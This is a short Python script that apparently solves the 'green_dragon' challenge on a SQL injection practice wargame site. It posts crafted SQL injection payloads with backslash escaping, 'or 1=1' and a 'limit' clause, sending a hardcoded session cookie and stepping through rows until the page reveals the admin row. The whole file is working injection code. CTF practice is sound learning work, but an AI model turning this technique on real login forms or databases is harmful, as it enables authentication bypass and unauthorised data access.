#!/usr/bin/py
#-*-coding:utf-8 -*-

import requests

def GetRowNumAdmin(t, s):
  START_ROW = 0
  i = START_ROW

  while True:
    try:
      tmpRow = str(i)
      payload = t + "?id=%5C&pw= or 1%3D1 limit " + tmpRow + ", 1%23"
      r = requests.post(payload, cookies=(dict(PHPSESSID=s)))
      print("%d %s" %(len(r.text), payload))

    except OSError as e:
      continue

    except Exception as e:
      print("GetRowNumAdmin() Error...")
      print(e)
      exit(1)

    if "GREEN_DRAGON" in r.text:
      return i
    
    i += 1

if __name__ == "__main__":
  t = "https://los.rubiya.kr/chall/green_dragon_74d944f888fd3f9cf76e4e230e78c45b.php"
  session = "o1b9iksdt2f2a409gmv4or4mcn" # Session

  rowNumAdmin = GetRowNumAdmin(t, session)
  print("Admin Row : %d\n" %(rowNumAdmin))
